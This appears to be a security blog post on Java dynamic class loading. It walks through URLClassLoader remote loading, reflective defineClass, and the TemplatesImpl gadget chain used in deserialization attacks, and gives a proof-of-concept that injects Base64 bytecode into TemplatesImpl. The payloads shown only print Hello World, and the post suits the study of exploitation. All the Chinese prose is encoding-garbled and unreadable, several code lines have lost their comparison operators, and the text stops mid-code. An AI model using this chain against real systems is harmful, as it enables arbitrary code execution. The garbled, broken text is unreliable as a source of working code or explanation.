        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯JAVAçš„å­—èŠ‚ç ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯JAVAçš„å­—èŠ‚ç ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯JAVAçš„å­—èŠ‚ç ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯JAVAçš„å­—èŠ‚ç ï¼Ÿ</h1><p>å­—èŠ‚ç  å…¶å®æŒ‡çš„æ˜¯Javaè™šæ‹Ÿæœºè¿è¡Œæ‰§è¡Œçš„æŒ‡ä»¤ï¼Œé€šè¿‡ç¼–è¯‘åï¼Œé€šå¸¸è¢«å‚¨å­˜åœ¨  .class   æ–‡ä»¶ä¸­ã€‚<br>å› ä¸ºè¯­è¨€æ˜¯è·¨å¹³å°çš„ï¼Œå…¶ä»–è¯­è¨€å¯ä»¥é€šè¿‡ç¼–è¯‘æˆ  .class  æ–‡ä»¶åï¼Œåœ¨Javaè™šæ‹Ÿæœºä¸­è¿è¡Œ~<br>ä½†æœ¬æ–‡æƒ³è¦è¯´çš„æ˜¯å­—èŠ‚ç  å¯ä»¥å°†.class æ–‡ä»¶ æ¢å¤æˆä¸€ä¸ªç±»ï¼Œåœ¨Jvmè™šæ‹Ÿæœºä¸­åŠ è½½ã€‚</p><h1 id="åˆ©ç”¨URLClassLoader-åŠ è½½è¿œç¨‹æ–‡ä»¶"><a href="#åˆ©ç”¨URLClassLoader-åŠ è½½è¿œç¨‹æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨URLClassLoader åŠ è½½è¿œç¨‹æ–‡ä»¶"></a>åˆ©ç”¨URLClassLoader åŠ è½½è¿œç¨‹æ–‡ä»¶</h1><p>æ­£å¸¸æƒ…å†µä¸‹ ä¼šä»¥ ä¸‰ç§æƒ…å†µæ¥å¯»æ‰¾  .class æ–‡ä»¶ ï¼š</p><ul><li>URLæœªä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€ä¸ªJARæ–‡ä»¶ï¼Œä½¿ç”¨ JarLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨JaråŒ…ä¸­å¯» æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åæ˜¯ file ï¼Œåˆ™ä½¿ç”¨ FileLoader æ¥å¯»æ‰¾ç±»ï¼Œå³ä¸ºåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­å¯» æ‰¾.classæ–‡ä»¶</li><li>URLä»¥æ–œæ  &#x2F; ç»“å°¾ï¼Œä¸”åè®®åä¸æ˜¯ file ï¼Œåˆ™ä½¿ç”¨æœ€åŸºç¡€çš„ Loader æ¥å¯»æ‰¾ç±»</li></ul><p>å¦‚æœæ˜¯é file åè®®çš„æƒ…å†µä¸‹ï¼Œæœ€å¸¸è§ä½¿ç”¨çš„åè®® åˆ™æ˜¯  http åè®®</p><p>æ¥ä¸‹æ¥æµ‹è¯•ä¸€ä¸‹åœ¨JAVAä¸­æ˜¯å¦èƒ½å¤Ÿä»è¿œç¨‹ HTTP ä¸­åŠ è½½ .class æ–‡ä»¶ï¼š</p><p>èµ·ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.net.URL;  </span><br><span class="line">import java.net.URLClassLoader;  </span><br><span class="line">public class Test &#123;  </span><br><span class="line">    public static void main( String[] args ) throws Exception &#123;  </span><br><span class="line">        URL[] urls = &#123;new URL(&quot;http://localhost:8000/&quot;)&#125;;  </span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);  </span><br><span class="line">        Class c = loader.loadClass(&quot;Hello&quot;);  </span><br><span class="line">        c.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hello.java:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">  </span><br><span class="line">import java.io.IOException;  </span><br><span class="line">  </span><br><span class="line">public class Hello &#123;  </span><br><span class="line">    public Hello() throws IOException &#123;  </span><br><span class="line">  </span><br><span class="line">        System.out.println(&quot;Hello World&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°† Hello.java ç¼–è¯‘æˆ .class æ–‡ä»¶ å¹¶åœ¨æœ¬ç›®å½•èµ·ä¸ª Python æœåŠ¡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/1.png" alt="one"></p><p>æˆåŠŸè¯·æ±‚åˆ° Hello.class å¹¶æ‰§è¡Œäº†å…¶ä¸­çš„å­—èŠ‚ç  è¾“å‡ºHello Worldï¼Œå¦‚æœèƒ½æ§åˆ¶ç›®æ ‡ Java ClassLoaderçš„è·¯å¾„ä½œä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥åˆ©ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><h1 id="åˆ©ç”¨ClassLoader-defineåŠ è½½è¿œç¨‹å­—èŠ‚ç "><a href="#åˆ©ç”¨ClassLoader-defineåŠ è½½è¿œç¨‹å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨ClassLoader#defineåŠ è½½è¿œç¨‹å­—èŠ‚ç "></a>åˆ©ç”¨ClassLoader#defineåŠ è½½è¿œç¨‹å­—èŠ‚ç </h1><p>æ— è®ºæ˜¯åŠ è½½è¿œç¨‹æ–‡ä»¶ è¿˜æ˜¯æœ¬åœ°çš„ jar  æˆ– .class  éƒ½ä¼šç»è¿‡ä¸‰ä¸ªæ–¹æ³•çš„è°ƒç”¨ã€‚</p><p>é€šä¿—çš„åˆ†ç±»ï¼š</p><ul><li>loadClass åœ¨æœ¬åœ°ç±»ç¼“å­˜ä¸­ã€å¤«åŠ è½½å™¨ä¸­å¯»æ‰¾ç±»ï¼Œå¦‚æ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™æ‰§è¡Œ findClass</li><li>findClass æ ¹æ®åŸºç¡€ URLæŒ‡å®šçš„æ–¹å¼ æ¥åŠ è½½ç±»çš„å­—èŠ‚ç  ç„¶åäº¤ç»™ defineClass</li><li>defineClass å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»</li></ul><p>å¯è§æ ¸å¿ƒæ˜¯ defineClass  ä»–çš„è¡Œä¸ºå°±æ˜¯å°†å­—èŠ‚ç çš„å½¢å¼è½¬æ¢æˆä¸€ä¸ªJavaç±»ã€‚</p><p>åœ¨  defineClass   è°ƒç”¨æ—¶ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡ æ˜¾å¼ çš„è°ƒç”¨ æ„é€ å‡½æ•°  åˆå§‹åŒ–ä»£ç æ‰ä¼šæ‰§è¡Œï¼Œå³ä½¿æ˜¯æ”¾å…¥static å—ä¸­ã€‚  ClassLoader ç±»ä¸­çš„ defineClass  æ˜¯ä¸ª  protected  å±æ€§ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨  defineClass  åˆ™éœ€è¦ä½¿ç”¨  åå°„  æ¥è°ƒç”¨ ,è¿™ä¸ª  defineClass   æ˜¯  TemplateImpl  æ”»å‡»é“¾çš„é‡ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import java.lang.reflect.Method;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);  </span><br><span class="line">        defineClass.setAccessible(true);  </span><br><span class="line">        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);  </span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code, 0, code.length);  </span><br><span class="line">        hello.newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="åˆ©ç”¨TemplatesImplè¿›è¡ŒåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨TemplatesImplè¿›è¡ŒåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨TemplatesImplè¿›è¡ŒåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨TemplatesImplè¿›è¡ŒåŠ è½½å­—èŠ‚ç </h1><p>åº•å±‚é“¾ è¿ç”¨åˆ°äº† æˆ‘ä»¬çš„ä¸»è§’  defineClass   ~  </p><p>ä¾èµ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>æœ¬æ¥ä¸æƒ³è·Ÿé“¾å­çš„ï¼Œä¹‹å‰ä¹Ÿå®¡è¿‡æ²¡å‘å‡ºæ¥ï¼Œ  ä½†ä½œä¸ºæœ¬ç¯‡çš„ç¬¬ä¸€ç¯‡ è¿˜æ˜¯è·Ÿä¸€ä¸‹å§</p><p>åœ¨   TemplatesImpl   çš„  TransletClassLoader  é‡è½½äº†  defineClass   æ–¹æ³• ï¼Œæœ‰ç‚¹é•¿ï¼Œå»å¤´å»å°¾è´´å‡ºæ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static final class TransletClassLoader extends ClassLoader &#123;  </span><br><span class="line">    private final Map&lt;String, Class&lt;?&gt;&gt; _loadedExternalExtensionFunctions;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;  </span><br><span class="line">        Class&lt;?&gt; ret = null;  </span><br><span class="line">        // The _loadedExternalExtensionFunctions will be empty when the  </span><br><span class="line">        // SecurityManager is not set and the FSP is turned off        if (_loadedExternalExtensionFunctions != null) &#123;  </span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        if (ret   null) &#123;  </span><br><span class="line">            ret = super.loadClass(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">        return ret;  </span><br><span class="line">     &#125;  </span><br><span class="line">    </span><br><span class="line">     Class&lt;?&gt; defineClass(final byte[] b) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; defineClass(final byte[] b, ProtectionDomain pd) &#123;  </span><br><span class="line">        return defineClass(null, b, 0, b.length, pd);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ defineClass  æ²¡æœ‰å†™æ˜ç±»å‹ï¼Œé»˜è®¤ä¸ºdefault æ‰€ä»¥åªèƒ½è¢«å†…éƒ¨è°ƒç”¨ã€‚</p><p>å†è·Ÿè¿›è°è°ƒç”¨äº† æ­¤  defineClass(x,y)  åœ¨ defineTransletClasses() ä¸­å‘ç° ï¼š</p><p>ä»£ç å¾ˆé•¿ åªè´´éƒ¨åˆ†<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/2.png" alt="one"></p><p>è°ƒç”¨äº† ä¸¤ä¸ªå½¢å‚çš„ defineClass ï¼Œå†ç´§æ¥ç€ è·Ÿè¿›è°è°ƒç”¨äº†  defineTransletClasses ï¼Œå‘ç°æ˜¯   getTransletInstance </p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/3.png" alt="one"></p><p>å†å‘ä¸Šå–   newTransformer  è°ƒç”¨äº†  getTransletInstance   è€ŒnewTransformer åˆè¢«getOutputPropertiesè°ƒç”¨ ï¼Œè‡³æ­¤ç»“æŸï¼Œå¹¶ä¸”  newTransformer  å’Œ  getOutputProperties æ˜¯ä¸€ä¸ªpublic çš„ç±»å‹ï¼Œå¯ä»¥è¢«å¤–éƒ¨è°ƒç”¨ã€‚</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/4.png" alt="one"></p><p>è°ƒç”¨é“¾ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; </span><br><span class="line">TemplatesImpl#newTransformer() -&gt; </span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; </span><br><span class="line">TemplatesImpl#defineTransletClasses() -&gt; </span><br><span class="line">TransletClassLoader#defineClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çŸ¥é“äº† è°ƒç”¨é“¾ï¼Œå°±è¦å¼€å§‹æ»¡è¶³ å…¶è°ƒç”¨çš„ä¼ å‚ï¼Œä¹Ÿå°±æ˜¯æ„æˆexp çš„ç»†èŠ‚ ä»è°ƒç”¨é“¾çš„å¼€å¤´æ¥è®¾è®¡å‚æ•°ï¼Œä»  newTransformer  å¼€å§‹ ï¼š</p><p>è°ƒç”¨äº†   getTransletInstance()  ä¸”ä¸éœ€è¦ä¼ å‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public synchronized Transformer newTransformer()  </span><br><span class="line">    throws TransformerConfigurationException  </span><br><span class="line">&#123;  </span><br><span class="line">    TransformerImpl transformer;  </span><br><span class="line">  </span><br><span class="line">    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,  </span><br><span class="line">        _indentNumber, _tfactory);</span><br></pre></td></tr></table></figure><p> getTransletInstance() </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private Translet getTransletInstance()  </span><br><span class="line">    throws TransformerConfigurationException &#123;  </span><br><span class="line">    try &#123;  </span><br><span class="line">        if (_name   null) return null;  </span><br><span class="line">  </span><br><span class="line">        if (_class   null) defineTransletClasses();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œéœ€è¦æ»¡è¶³  name å’Œ class  ä¸ä¸º nullï¼Œ  æ‰ä¼šè°ƒç”¨  defineTransletClasses()<br>è¿™é‡Œçš„ä¸¤ä¸ªå€¼ éƒ½æ˜¯ä¿æŠ¤å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åå°„ æš´åŠ›ä¿®æ”¹å…¶å€¼ï¼Œä¸è¿‡éƒ½æ˜¯åè¯<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/5.png" alt="one"></p><p>æ¥åˆ°  defineTransletClasses()  çœ‹åˆ°å‰é¢æœ‰ä¸ªåˆ¤æ–­<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/6.png" alt="one"></p><p>è¿™é‡Œçš„ bytecodes éœ€è¦ä¸ä¸ºnull æ‰èƒ½ç»§ç»­å¾€ä¸‹èµ°ï¼Œé‚£ä¹ˆæˆ‘ä»¬åˆ°è¿™å°±æ˜¯è¦è®¾ 3ä¸ªå€¼äº†</p><p>æ­¤å¤„ çš„ loader.defineClass(bytecodes[i])  å¯ä»¥çœ‹å‡º bytecodes å°±æ˜¯æˆ‘ä»¬è¦åŠ è½½çš„ å­—èŠ‚ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (int i = 0; i &lt; classCount; i++) &#123;  </span><br><span class="line">    _class[i] = loader.defineClass(_bytecodes[i], pd);  </span><br><span class="line">    final Class&lt;?&gt; superClass = _class[i].getSuperclass();</span><br></pre></td></tr></table></figure><p>ä½†åœ¨ä¸­é—´è¿˜æœ‰ä¸ªå‘  é‚£å°±æ˜¯åœ¨ä¸­é—´ä¼šæ‰§è¡Œ run() æ–¹æ³•ï¼š</p><p><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/7.png" alt="one"></p><p>è°ƒç”¨çš„æ˜¯   tfactory.getExternalExtensionsMap()   è·Ÿè¿›åï¼Œå‘ç°getExternalExtensionsMap()æ˜¯TransformerFactoryImplç±»<br><img src="/2023/05/16/JAVA%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/8.png" alt="one"></p><p>æ„é€   tfactory  ä¸º  TransformerFactoryImpl  ç±»å³å¯~</p><p>ç®€å•çš„POCï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package dynamic;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">import java.lang.reflect.Field;  </span><br><span class="line">import java.util.Base64;  </span><br><span class="line">public class HelloDefineClass &#123;  </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;  </span><br><span class="line">            byte[] code =  </span><br><span class="line">                Base64.getDecoder().decode(&quot;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=&quot;);  </span><br><span class="line">            TemplatesImpl obj = new TemplatesImpl();  </span><br><span class="line">            setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);  </span><br><span class="line">            setFieldValue(obj, &quot;_name&quot;, &quot;Ku1s-&quot;);  </span><br><span class="line">            setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());  </span><br><span class="line">            obj.newTransformer();  </span><br><span class="line">        &#125;  </span><br><span class="line">        public static void setFieldValue(Object obj,String name, Object value) throws NoSuchFieldException, IllegalAccessException &#123;  </span><br><span class="line">            Field field = obj.getClass().getDeclaredField(name);  </span><br><span class="line">            field.setAccessible(true);  </span><br><span class="line">            field.set(obj,value);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ ï¼ŒsetFieldValue æ–¹æ³•ç”¨æ¥è®¾ç½®ç§æœ‰å±æ€§ï¼Œå¯è§ï¼Œè¿™é‡Œæˆ‘è®¾ç½®äº†ä¸‰ä¸ªå±æ€§ï¼š _bytecodes ã€ _name å’Œ _tfactory ã€‚ _bytecodes æ˜¯ç”±å­—èŠ‚ç ç»„æˆçš„æ•°ç»„ï¼› _name å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ä¸²ï¼Œåªè¦ä¸ä¸ºnullå³å¯ï¼› _tfactory éœ€è¦æ˜¯ä¸€ä¸ª TransformerFactoryImpl å¯¹è±¡ï¼Œå› ä¸º TemplatesImpl#defineTransletClasses() æ–¹æ³•é‡Œæœ‰è°ƒç”¨åˆ° _tfactory.getExternalExtensionsMap() ï¼Œå¦‚æœæ˜¯nullä¼šå‡ºé”™</p><p>ä½†æœ‰ä¸ªç‚¹éœ€è¦æ³¨æ„ TemplatesImpl ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼šè¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯ com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet çš„å­ç±»ã€‚<br>åˆ†æä¸‹å…·ä½“åŸå› ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private int _transletIndex = -1;</span><br><span class="line">..............................</span><br><span class="line"></span><br><span class="line">if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"> else &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">    &#125;     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (_transletIndex &lt; 0) &#123;</span><br><span class="line">   ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">   throw new TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨defineTransletClasses()ä¸­ï¼Œelseä¸­çš„_auxClassesé»˜è®¤å€¼ä¸ºnullï¼Œæ‰€ä»¥è°ƒç”¨putæ–¹æ³•åå°±ä¼šæŠ¥é”™ï¼Œè€Œä¸”_transletIndex é»˜è®¤å€¼ä¸º-1ï¼Œå³ä½¿ç»™_auxClassesèµ‹å€¼ä¹Ÿä¼šåœ¨ä¸‹è¾¹çš„ifå¤„æŠ›å‡ºå¼‚å¸¸ä»è€ŒæŠ¥é”™ï¼Œæ‰€ä»¥è¿™é‡Œå°±éœ€è¦è¿›å…¥ifè¯­å¥ï¼Œè€Œifä¸­ä¼šåˆ¤æ–­çˆ¶ç±»åæ˜¯å¦è·ŸABSTRACT_TRANSLETç›¸åŒï¼Œè·Ÿè¿›çœ‹ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static String ABSTRACT_TRANSLET</span><br><span class="line">= &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨æ„é€ æ—¶å°±éœ€è¦ç»§æ‰¿äº<code>AbstractTranslet</code>ï¼Œè€Œ<code>AbstractTranslet</code>æ˜¯ä¸ªæŠ½è±¡ç±»å°±éœ€è¦å®ç°å®ƒæœªå®ç°çš„æ¥å£ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªçš„&#96;transform()</p><p>è€Œ<code>AbstractTranslet</code>è¿˜ç»§æ‰¿äº†<code>Translet</code>ï¼Œ<code>Translet</code>ä¹Ÿæœ‰ä¸€ä¸ª<code>transform()</code>æ²¡æœ‰å®ç°ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå°±éœ€è¦åŒæ—¶å®ç°ä¸¤ä¸ªç±»çš„<code>transform()</code>ï¼Œå³ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException; </span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; </span><br><span 